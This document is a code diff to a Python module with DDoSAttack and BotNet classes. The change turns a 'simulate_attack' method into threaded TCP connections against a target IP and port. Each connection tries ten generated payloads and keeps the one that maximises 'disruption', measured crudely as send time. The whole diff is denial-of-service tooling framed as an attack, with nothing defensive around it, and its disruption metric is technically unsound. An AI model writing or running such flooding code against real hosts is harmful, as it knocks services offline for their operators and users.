@@ -4,6 +4,7 @@ import socket
 import threading
 from .random_string_generator import RandomStringGenerator
 import logging
+import time
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
@@ -16,25 +17,40 @@ class DDoSAttack:
         self.target_port = target_port
         self.num_connections = num_connections
         self.threads = []
-        self.model = RandomStringGenerator(100)
+        self.model = RandomStringGenerator()
 
-    def simulate_attack(self):
+    def create_connection(self):
         for _ in range(self.num_connections):
-            thread = threading.Thread(target=self.create_connection)
+            thread = threading.Thread(target=self.run_attack)
             self.threads.append(thread)
             thread.start()
 
-    def create_connection(self):
+    def run_attack(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_ip, self.target_port))
-            payload = self.model(torch.tensor([])).encode()  # Generate payload
-            sock.send(payload)
-            logging.info(f"Payload sent:", payload)
-            sock.send(b"QUIT")
-            sock.close()
+            # Generate different types of payloads and pick the one that leads to maximum disruption
+            max_disruption = -1
+            best_payload = None
+            for _ in range(10):  # try 10 different types of payloads
+                payload = self.model.generate_payload()
+                start_time = time.time()
+                self.send_payload(sock, payload)
+                response_time = time.time() - start_time
+                disruption = self.measure_disruption(response_time)
+                if disruption > max_disruption:
+                    max_disruption = disruption
+                    best_payload = payload
+            logging.info(f"Best payload: {best_payload}")
         except Exception as e:
-            logging.error(f"Exception occurred while creating a connection: {e}")
+            logging.error(f"Exception occurred while running an attack: {e}")
+
+    def send_payload(self, sock, payload):
+        sock.send(payload.encode())
+
+    def measure_disruption(self, response_time):
+        # The longer the response time, the higher the disruption
+        return response_time
 
     def wait_for_threads(self):
         for thread in self.threads:
@@ -56,6 +72,6 @@ class BotNet:
 
     def launch_attack(self):
         for bot in self.bots:
-            bot.simulate_attack()
+            bot.create_connection()
         for bot in self.bots:
             bot.wait_for_threads()
